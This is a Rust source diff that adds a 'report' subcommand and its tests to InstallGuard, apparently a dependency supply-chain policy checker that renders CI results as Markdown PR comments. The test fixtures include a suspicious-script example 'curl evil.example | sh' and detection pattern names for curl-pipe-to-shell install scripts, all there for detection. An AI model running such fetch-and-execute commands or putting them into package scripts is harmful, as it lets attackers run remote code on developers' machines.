@@ -5,7 +5,7 @@
 //! * `ci`   — pipeline use; machine-readable summary, optional GitHub
 //!   workflow annotations, configurable failure thresholds.
 
-use std::io::Write;
+use std::io::{Read, Write};
 use std::path::{Path, PathBuf};
 use std::process::ExitCode;
 use std::sync::Arc;
@@ -76,6 +76,14 @@ enum Command {
     /// producing a DSSE v1 envelope that `cosign verify-blob` can
     /// validate.
     Sign(SignArgs),
+    /// Render a previously-emitted `ci --summary-file` JSON document
+    /// as a Markdown sticky-comment body suitable for posting to a
+    /// GitHub PR or GitLab MR. The output is deterministic, includes
+    /// an HTML marker comment for sticky-comment idempotency, and
+    /// uses the canonical `Reason::human_summary()` renderer so every
+    /// reason variant is described the same way across all surfaces
+    /// (PR comment, audit log, VEX `action_statement`).
+    Report(ReportArgs),
 }
 
 #[derive(Debug, clap::Subcommand)]
@@ -283,6 +291,50 @@ struct VexArgs {
     author: Option<String>,
 }
 
+#[derive(Debug, clap::Args)]
+struct ReportArgs {
+    /// Path to a previously emitted `ci --summary-file` JSON document.
+    /// Use `-` to read from stdin.
+    #[arg(long)]
+    from: PathBuf,
+
+    /// Output format. Currently only `markdown` is supported (GitHub +
+    /// GitLab GFM, which renders identically on both platforms). The
+    /// flag exists to leave room for `sarif` / `text` formats in
+    /// future without a CLI break.
+    #[arg(long, value_enum, default_value_t = ReportFormat::Markdown)]
+    format: ReportFormat,
+
+    /// Maximum number of flagged packages to render in the table.
+    /// Excess packages are summarised as "...and N more (truncated)."
+    /// to keep the comment under platform body-size limits (GitHub
+    /// 65 536 chars, GitLab 1 000 000 chars but practically much less).
+    #[arg(long, default_value_t = 50)]
+    max_rows: usize,
+
+    /// Optional commit SHA to embed in the comment footer. Surfaces
+    /// the commit the report was produced against without needing the
+    /// CI runner to inject it via shell substitution.
+    #[arg(long)]
+    commit: Option<String>,
+
+    /// Optional integer to embed in the footer next to the commit
+    /// (typically the `installguard ci` exit code). Surfaces "exit 1"
+    /// in the rendered comment so reviewers see policy outcome at a
+    /// glance.
+    #[arg(long)]
+    exit_code: Option<i32>,
+
+    /// Where to write the rendered body. Defaults to stdout.
+    #[arg(long)]
+    out: Option<PathBuf>,
+}
+
+#[derive(Debug, Clone, Copy, ValueEnum)]
+enum ReportFormat {
+    Markdown,
+}
+
 #[derive(Debug, Clone, Copy, ValueEnum)]
 enum OutputFormat {
     Human,
@@ -313,6 +365,7 @@ async fn main() -> ExitCode {
             run_key_generate(&priv_out, &pub_out)
         }
         Command::Sign(args) => run_sign(args),
+        Command::Report(args) => run_report(args),
     };
     match result {
         Ok(code) => code,
@@ -1249,6 +1302,200 @@ fn build_json_summary(out: &EvalOutput) -> serde_json::Value {
     })
 }
 
+// ── `report` subcommand ─────────────────────────────────────────────────────
+//
+// Renders a previously-emitted `ci --summary-file` JSON document as a
+// Markdown sticky-comment body suitable for posting to a PR/MR. This is the
+// single source of truth for InstallGuard's PR-comment renderer; the GitHub
+// Action and the GitLab CI template both shell out to it. Keeping the
+// renderer in Rust (and unit-tested) avoids duplicated and out-of-date
+// JS/Python implementations that miss new `Reason` variants.
+
+const STICKY_MARKER: &str = "<!-- installguard-summary -->";
+
+fn run_report(args: ReportArgs) -> Result<ExitCode> {
+    let ReportArgs {
+        from,
+        format,
+        max_rows,
+        commit,
+        exit_code,
+        out,
+    } = args;
+    let raw = if from == PathBuf::from("-") {
+        let mut buf = String::new();
+        std::io::stdin().read_to_string(&mut buf)?;
+        buf
+    } else {
+        std::fs::read_to_string(&from)
+            .with_context(|| format!("reading summary from {}", from.display()))?
+    };
+    let value: serde_json::Value =
+        serde_json::from_str(&raw).context("parsing summary JSON")?;
+    let body = match format {
+        ReportFormat::Markdown => render_markdown(&value, max_rows, commit.as_deref(), exit_code),
+    };
+    if let Some(path) = out {
+        std::fs::write(&path, &body)
+            .with_context(|| format!("writing report to {}", path.display()))?;
+    } else {
+        print!("{body}");
+    }
+    Ok(ExitCode::SUCCESS)
+}
+
+fn render_markdown(
+    summary_doc: &serde_json::Value,
+    max_rows: usize,
+    commit: Option<&str>,
+    exit_code: Option<i32>,
+) -> String {
+    use std::fmt::Write as _;
+    let summary = summary_doc.get("summary");
+    let total = summary
+        .and_then(|s| s.get("total"))
+        .and_then(serde_json::Value::as_u64)
+        .unwrap_or(0);
+    let allow = summary
+        .and_then(|s| s.get("allow"))
+        .and_then(serde_json::Value::as_u64)
+        .unwrap_or(0);
+    let warn = summary
+        .and_then(|s| s.get("warn"))
+        .and_then(serde_json::Value::as_u64)
+        .unwrap_or(0);
+    let block = summary
+        .and_then(|s| s.get("block"))
+        .and_then(serde_json::Value::as_u64)
+        .unwrap_or(0);
+
+    // Use literal Unicode rather than `:no_entry:` shortcodes so the body
+    // renders identically on GitHub, GitLab, Gitea, Forgejo, and any other
+    // GFM consumer.
+    let (icon, verdict) = if block > 0 {
+        ("🚫", "BLOCKED")
+    } else if warn > 0 {
+        ("⚠️", "Warnings")
+    } else {
+        ("✅", "Clean")
+    };
+
+    let mut out = String::with_capacity(1024);
+    out.push_str(STICKY_MARKER);
+    out.push('\n');
+    let _ = writeln!(out, "## {icon} InstallGuard — {verdict}\n");
+    out.push_str("| Total | Allow | Warn | Block |\n|---:|---:|---:|---:|\n");
+    let _ = writeln!(out, "| {total} | {allow} | {warn} | **{block}** |\n");
+
+    let empty = Vec::new();
+    let decisions = summary_doc
+        .get("decisions")
+        .and_then(serde_json::Value::as_array)
+        .unwrap_or(&empty);
+    let flagged: Vec<&serde_json::Value> = decisions
+        .iter()
+        .filter(|d| {
+            d.get("decision").and_then(serde_json::Value::as_str)
+                != Some("allow")
+        })
+        .collect();
+
+    if flagged.is_empty() {
+        let _ = writeln!(out, "_All {total} dependencies passed policy._");
+    } else {
+        out.push_str("### Flagged packages\n\n| Decision | Package | Reason |\n|---|---|---|\n");
+        for d in flagged.iter().take(max_rows) {
+            let name = d
+                .get("name")
+                .and_then(serde_json::Value::as_str)
+                .unwrap_or("?");
+            let version = d
+                .get("version")
+                .and_then(serde_json::Value::as_str)
+                .unwrap_or("?");
+            let decision = d
+                .get("decision")
+                .and_then(serde_json::Value::as_str)
+                .unwrap_or("?")
+                .to_uppercase();
+            let reason_text = render_reasons_cell(d);
+            let _ = writeln!(
+                out,
+                "| {decision} | `{name}@{version}` | {reason_text} |"
+            );
+        }
+        if flagged.len() > max_rows {
+            let _ = writeln!(
+                out,
+                "\n_…and {} more (truncated)._",
+                flagged.len() - max_rows
+            );
+        }
+    }
+
+    let schema = summary_doc
+        .get("schemaVersion")
+        .and_then(serde_json::Value::as_u64)
+        .unwrap_or(1);
+    out.push_str("\n<sub>schema v");
+    out.push_str(&schema.to_string());
+    if let Some(rc) = exit_code {
+        let _ = write!(out, " · exit {rc}");
+    }
+    if let Some(sha) = commit {
+        // Trim to short SHA when a full one is supplied; pass through anything else.
+        let short = if sha.len() >= 7 && sha.bytes().all(|b| b.is_ascii_hexdigit()) {
+            &sha[..7]
+        } else {
+            sha
+        };
+        let _ = write!(out, " · commit {short}");
+    }
+    out.push_str("</sub>\n");
+    out
+}
+
+/// Render the `reasons` array of a single decision into one cell of the
+/// markdown table. Each reason is decoded via the canonical
+/// `Reason::human_summary()` so PR comments stay in sync with VEX
+/// statements and audit-log lines without per-surface `match` arms.
+/// Reasons that fail to decode (e.g. a future variant emitted by a
+/// newer InstallGuard) fall back to their stable `code` tag so the
+/// renderer never panics on forward-incompatible input.
+fn render_reasons_cell(decision: &serde_json::Value) -> String {
+    let Some(reasons) = decision
+        .get("details")
+        .and_then(|d| d.get("reasons"))
+        .and_then(serde_json::Value::as_array)
+    else {
+        return "(no reason)".to_string();
+    };
+    if reasons.is_empty() {
+        return "(no reason)".to_string();
+    }
+    reasons
+        .iter()
+        .map(|r| {
+            if let Ok(decoded) = serde_json::from_value::<Reason>(r.clone()) {
+                escape_table_cell(&decoded.human_summary())
+            } else {
+                // Forward-compat: unknown variant — surface its `code` tag.
+                let code = r
+                    .get("code")
+                    .and_then(serde_json::Value::as_str)
+                    .unwrap_or("unknown");
+                format!("`{code}`")
+            }
+        })
+        .collect::<Vec<_>>()
+        .join("; ")
+}
+
+/// Markdown table cells must not contain raw `|` or newlines — escape both.
+fn escape_table_cell(s: &str) -> String {
+    s.replace('|', "\\|").replace('\n', " ")
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1261,5 +1508,220 @@ mod tests {
     #[test]
     fn workflow_data_keeps_colons_and_commas() {
         assert_eq!(escape_workflow_data("a:b,c\nd%e"), "a:b,c%0Ad%25e");
+    }
+
+    fn summary(decisions: &serde_json::Value, totals: (u64, u64, u64, u64)) -> serde_json::Value {
+        let (total, allow, warn, block) = totals;
+        serde_json::json!({
+            "schemaVersion": 1,
+            "summary": { "total": total, "allow": allow, "warn": warn, "block": block },
+            "decisions": decisions,
+        })
+    }
+
+    fn dec(name: &str, version: &str, decision: &str, reasons: &serde_json::Value) -> serde_json::Value {
+        serde_json::json!({
+            "name": name,
+            "version": version,
+            "decision": decision,
+            "details": { "outcome": decision, "reasons": reasons },
+        })
+    }
+
+    #[test]
+    fn report_clean_run_has_marker_table_and_clean_verdict() {
+        let doc = summary(&serde_json::json!([]), (12, 12, 0, 0));
+        let body = render_markdown(&doc, 50, None, None);
+        assert!(body.starts_with(STICKY_MARKER), "missing sticky marker: {body}");
+        assert!(body.contains("✅"));
+        assert!(body.contains("Clean"));
+        assert!(body.contains("| 12 | 12 | 0 | **0** |"));
+        assert!(body.contains("All 12 dependencies passed policy"));
+    }
+
+    #[test]
+    fn report_block_uses_blocked_verdict_and_uppercases_decision() {
+        let reasons = serde_json::json!([{
+            "code": "release_age_below_threshold",
+            "observed_minutes": 60,
+            "required_minutes": 1440,
+        }]);
+        let doc = summary(
+            &serde_json::json!([dec("left-pad", "1.0.0", "block", &reasons)]),
+            (1, 0, 0, 1),
+        );
+        let body = render_markdown(&doc, 50, Some("abcdef0123456789"), Some(1));
+        assert!(body.contains("🚫"));
+        assert!(body.contains("BLOCKED"));
+        assert!(body.contains("| BLOCK | `left-pad@1.0.0` | release age 60m below required minimum 1440m |"));
+        assert!(body.contains("· exit 1"));
+        assert!(body.contains("· commit abcdef0"), "short SHA not rendered: {body}");
+    }
+
+    #[test]
+    fn report_warn_uses_warning_verdict() {
+        let reasons = serde_json::json!([{ "code": "published_at_unknown" }]);
+        let doc = summary(
+            &serde_json::json!([dec("foo", "2.0.0", "warn", &reasons)]),
+            (1, 0, 1, 0),
+        );
+        let body = render_markdown(&doc, 50, None, None);
+        assert!(body.contains("⚠"));
+        assert!(body.contains("Warnings"));
+        assert!(body.contains("WARN"));
+    }
+
+    #[test]
+    fn report_truncates_at_max_rows() {
+        let mut decisions = Vec::new();
+        for i in 0..10 {
+            decisions.push(dec(
+                &format!("pkg{i}"),
+                "1.0.0",
+                "block",
+                &serde_json::json!([{ "code": "published_at_unknown" }]),
+            ));
+        }
+        let doc = summary(&serde_json::Value::Array(decisions), (10, 0, 0, 10));
+        let body = render_markdown(&doc, 3, None, None);
+        assert!(body.contains("`pkg0@1.0.0`"));
+        assert!(body.contains("`pkg2@1.0.0`"));
+        assert!(!body.contains("`pkg3@1.0.0`"), "row over limit leaked");
+        assert!(body.contains("…and 7 more (truncated)."));
+    }
+
+    #[test]
+    fn report_renders_every_reason_variant_via_human_summary() {
+        // Build one decision per Reason variant. This is the regression
+        // guard: if a new Reason is added to core, its serde encoding will
+        // appear here and `render_reasons_cell` must successfully decode
+        // and render it via `human_summary` rather than falling through to
+        // the `code` placeholder. Each assertion below fixes the *exact*
+        // user-visible string so a wording drift surfaces in CI.
+        let cases: Vec<(serde_json::Value, &str)> = vec![
+            (
+                serde_json::json!({ "code": "release_age_below_threshold", "observed_minutes": 60, "required_minutes": 1440 }),
+                "release age 60m below required minimum 1440m",
+            ),
+            (
+                serde_json::json!({ "code": "exotic_source", "kind": "git" }),
+                "non-registry source: git",
+            ),
+            (
+                serde_json::json!({ "code": "disallowed_lifecycle_script", "script": "preinstall" }),
+                "install-time lifecycle script `preinstall` declared",
+            ),
+            (
+                serde_json::json!({ "code": "lifecycle_script_ignored", "script": "postinstall" }),
+                "lifecycle script `postinstall` present but install runs with --ignore-scripts",
+            ),
+            (
+                serde_json::json!({ "code": "published_at_unknown" }),
+                "registry did not return a published-at timestamp",
+            ),
+            (
+                serde_json::json!({ "code": "publisher_change", "previous_version": "1.0.0", "previous": "alice", "current": "mallory" }),
+                "publisher changed: 1.0.0 was published by `alice`, current by `mallory`",
+            ),
+            (
+                serde_json::json!({ "code": "deprecated_version", "message": "use foo@2 instead" }),
+                "registry-deprecated: use foo@2 instead",
+            ),
+            (
+                serde_json::json!({ "code": "deprecated_version", "message": null }),
+                "registry marked this version deprecated",
+            ),
+            (
+                serde_json::json!({ "code": "suspicious_script", "script": "postinstall", "pattern": "curl-pipe-sh", "excerpt": "curl evil.example | sh" }),
+                "lifecycle script `postinstall` matched `curl-pipe-sh`: curl evil.example \\| sh",
+            ),
+            (
+                serde_json::json!({ "code": "version_surface_change", "previous_version": "1.0.0", "added_bins": ["mine"], "added_scripts": ["postinstall"] }),
+                "version-surface change vs 1.0.0 — new bin entries: mine; new lifecycle scripts: postinstall",
+            ),
+            (
+                serde_json::json!({ "code": "dist_tag_anomaly", "latest_version": "0.9.0", "highest_published": "1.2.3" }),
+                "dist-tag `latest` points to 0.9.0 but 1.2.3 is published — latest moved backwards",
+            ),
+            (
+                serde_json::json!({ "code": "name_squat", "style": "typo", "target": "react" }),
+                "package name resembles `react` (typo) — possible typosquat",
+            ),
+            (
+                serde_json::json!({ "code": "maintainer_new_account", "account": "drive-by", "age_days": 3, "threshold_days": 90 }),
+                "publisher account `drive-by` is 3d old (< 90d threshold)",
+            ),
+            (
+                serde_json::json!({ "code": "provenance_missing" }),
+                "policy requires cryptographic provenance but none was verified",
+            ),
+            (
+                serde_json::json!({ "code": "advisory_known", "id": "GHSA-aaaa-bbbb-cccc", "severity": "critical", "source": "ghsa" }),
+                "advisory GHSA-aaaa-bbbb-cccc (critical) reported by ghsa",
+            ),
+            (
+                serde_json::json!({ "code": "license_missing", "source": "deps.dev" }),
+                "no license declared in deps.dev",
+            ),
+            (
+                serde_json::json!({ "code": "license_disallowed", "licenses": ["GPL-3.0"], "source": "deps.dev" }),
+                "license `GPL-3.0` (per deps.dev) is not on the policy allowlist",
+            ),
+            (
+                serde_json::json!({ "code": "project_archived", "source": "deps.dev" }),
+                "upstream project is marked archived in deps.dev",
+            ),
+            (
+                serde_json::json!({ "code": "scorecard_below_threshold", "score": 3, "threshold": 6, "repo": "github.com/o/r", "source": "openssf-scorecard" }),
+                "OpenSSF Scorecard 3/10 for github.com/o/r is below the 6 threshold (per openssf-scorecard)",
+            ),
+            (
+                serde_json::json!({ "code": "trust_score_below_threshold", "score": 30, "threshold": 70 }),
+                "trust score 30/100 is below the 70 threshold",
+            ),
+            (
+                serde_json::json!({ "code": "signal_unavailable", "provider": "osv", "reason": "503 Service Unavailable" }),
+                "signal provider `osv` unavailable: 503 Service Unavailable",
+            ),
+        ];
+        for (reason, expected) in cases {
+            let dec_json = dec("p", "1.0.0", "block", &serde_json::json!([reason.clone()]));
+            let cell = render_reasons_cell(&dec_json);
+            assert_eq!(cell, expected, "reason {reason:?}");
+        }
+    }
+
+    #[test]
+    fn report_falls_back_to_code_for_unknown_variant() {
+        // A future InstallGuard might add a Reason variant this binary does
+        // not know about. The renderer must surface the stable code rather
+        // than panic.
+        let dec_json = dec(
+            "p",
+            "1.0.0",
+            "block",
+            &serde_json::json!([{ "code": "future_unknown_reason", "extra": 42 }]),
+        );
+        assert_eq!(render_reasons_cell(&dec_json), "`future_unknown_reason`");
+    }
+
+    #[test]
+    fn report_escapes_pipe_characters_in_reason_cell() {
+        // Suspicious-script excerpts can contain `|` (e.g. curl-pipe-sh).
+        // Without escaping these would corrupt the markdown table.
+        let dec_json = dec(
+            "p",
+            "1.0.0",
+            "block",
+            &serde_json::json!([{
+                "code": "suspicious_script",
+                "script": "postinstall",
+                "pattern": "curl-pipe",
+                "excerpt": "curl x | sh"
+            }]),
+        );
+        let cell = render_reasons_cell(&dec_json);
+        assert!(cell.contains("\\|"), "unescaped pipe in cell: {cell}");
+        assert!(!cell.contains(" | "), "raw pipe survived in cell: {cell}");
     }
 }
